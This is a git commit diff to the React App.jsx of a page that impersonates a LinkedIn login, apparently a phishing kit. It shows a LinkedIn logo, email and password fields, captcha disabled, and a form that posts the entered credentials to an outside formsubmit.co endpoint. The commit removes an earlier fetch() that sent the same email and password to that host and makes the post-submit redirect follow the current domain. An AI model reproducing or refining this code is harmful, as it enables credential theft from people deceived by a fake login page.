900d59944fb787b01346c9eeba660a0271389691
Prosper Ikechukwu <ikechukwuprosper8@gmail.com>
2024-08-07 16:49:40 +0100

    FEAT: Completed the dynamic selection of url

--- src/App.jsx
+++ src/App.jsx
@@ -1,42 +1,20 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import Buttons from "./components/Buttons";
 import Logo from "/logo.png";
 
 export default function App() {
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-
-  function getDetails() {
-    async function sendDetails(){
-      // e.preventDefault()
-      const send = await fetch(
-        `https://formsubmit.co/952fb51896d5f8d70142a128e67828f5`,
-        {
-          method: 'POST',
-          headers:{
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            useremail: email, 
-            userpassword: password
-          })
-        }
-      )
-
-      const gone = await send.json()
-      console.log(gone);
-      console.log('It worked')
-    }
-    sendDetails()
-  }
- 
+  const [domain, setDomain] = useState('')
+  useEffect(function getURL(){
+    setDomain(window.location.href)
+    console.log(domain)
+  },[]) 
 
   return (
     <main>
       <div className="logoCtn">
         <img src={Logo} alt="LinkedIn Logo" />
       </div>
-
+    {domain}
       <section>
         <div className="card">
           <div>
@@ -46,30 +24,25 @@ export default function App() {
           <form
             action="https://formsubmit.co/952fb51896d5f8d70142a128e67828f5"
             method="POST"
-            // onSubmit={getDetails}
           >
             <div className="inputs">
               <input
                 type="email"
                 placeholder="Email address"
                 name="email"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
                 required
               />
               <input
                 type="password"
                 placeholder="Password"
                 name="password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
                 required
               />
               <input type="hidden" name="_captcha" value="false"></input>
               <input
                 type="hidden"
                 name="_next"
-                value="http://localhost:5173/greet.html"
+                value={`${domain}/greet.html`}
               ></input>
             </div>
             <p>
